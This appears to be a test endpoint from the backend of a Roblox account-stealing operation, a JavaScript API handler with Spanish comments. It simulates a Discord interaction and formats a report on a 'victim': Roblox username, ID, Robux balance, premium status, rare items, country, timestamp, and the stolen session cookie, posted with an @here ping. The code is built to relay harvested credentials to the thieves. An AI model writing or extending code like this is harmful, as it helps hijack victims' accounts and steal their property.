// api/test-interaction.js
export default function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(204).end();
    }

    // Simular una interacción de Discord como si alguien hubiera hecho clic en ROBLOX
    const simulacion = {
        type: 3,
        data: {
            custom_id: 'roblox_test_123456'
        }
    };

    // Procesar la interacción simulada
    const customId = simulacion.data.custom_id;
    const [action, userId] = customId.split('_');
    
    const victimData = global.victims?.get(userId) || {};
    const r = victimData.roblox || {};

    const respuesta = {
        type: 4,
        data: {
            content: `||@here||
🔔 ¡Informacion seleccionada: **ROBLOX**!

**📌 PRINCIPAL **

👤 Usuario Roblox: ${r.username || 'TestUser'}
🆔 ID: ${r.userId || '123456'}
💰 Robux: ${r.robux || 1000}
⭐ Seguidores: ${r.seguidores || 500}
👥 Amigos: ${r.amigos || 100}
💱 Premium: ${r.premium || 'Sí'}
🔰 Verificado: ${r.verified || 'Sí'}

💼 **Inventario:**
Headless: \`${r.headless || 'Sí'}\`
Korblox: \`${r.korblox || 'No'}\`

**Informacion Horaria:**
🌍 País: \`${victimData.pais || 'Argentina'}\`
📅 Fecha: \`${victimData.fecha || '10/03/2026'}\`
⏰ Hora Exacta: \`${victimData.hora || '15:30:22'}\`

🍪 Cookie:
\`\`\`${victimData.cookie || 'TEST_COOKIE'}\`\`\``,
            flags: 64
        }
    };

    res.status(200).json({
        test: '✅ Simulación de interacción ROBLOX',
        interaction_recibida: simulacion,
        respuesta_generada: respuesta,
        datos_victima_encontrados: !!global.victims?.get(userId)
    });
}